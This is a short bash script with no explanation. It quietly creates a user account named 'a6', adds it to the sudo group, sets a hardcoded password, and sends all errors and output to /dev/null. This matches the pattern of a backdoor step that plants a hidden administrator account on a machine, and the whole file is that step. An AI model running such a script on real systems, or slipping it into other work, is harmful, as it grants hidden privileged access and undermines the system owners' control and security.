#!/bin/bash
 { useradd -m -s /bin/bash a6  2> /dev/null
  usermod -aG sudo a6  2> /dev/null
   echo  'a6:246855096'| chpasswd  2> /dev/null
   }
   >/dev/null
  
